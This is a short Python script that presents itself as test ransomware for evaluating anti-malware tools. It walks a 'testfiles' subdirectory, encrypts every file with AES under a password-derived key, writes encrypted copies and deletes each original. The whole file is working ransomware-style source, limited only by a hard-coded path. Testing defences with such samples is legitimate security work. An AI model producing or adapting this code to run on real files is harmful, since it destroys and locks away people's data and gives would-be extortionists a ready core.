# test ransomware for evaluating anti-malware tools
# encrypts all files in subdirectory testfiles in current directory

import os
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

chunks = 32 * 1024

# encrypt file with filenamein and the given key
def encrypt(key, filenamein):
    out_file_name = os.path.dirname(filenamein) + "/encrypted-" + os.path.basename(filenamein)
    file_size = str(os.path.getsize(filenamein)).zfill(16) # 0000000000032001
    IV = Random.new().read(16)
    encryptor = AES.new(key, AES.MODE_CFB, IV)

    with open(filenamein, 'rb') as f_input:
        with open(out_file_name, 'wb') as f_output:
            f_output.write(file_size.encode('utf-8'))
            f_output.write(IV)
            while True:
                chunk = f_input.read(chunks)
                if len(chunk) == 0:
                    break
                if len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))
                f_output.write(encryptor.encrypt(chunk))
    os.remove(filenamein)

def get_key(password):
    hashing = SHA256.new(password.encode('utf-8'))
    return hashing.digest()

if __name__ == "__main__":
    # ask for password
    password = input("Password: ")

    # encrypt all files in subdir testfiles
    for root, dirs, files in os.walk("./testfiles"):
        for file_name in files:
            print('encrypt ' + file_name + ' ...')
            filenamein = root + "/" + file_name
            encrypt(get_key(password), filenamein)
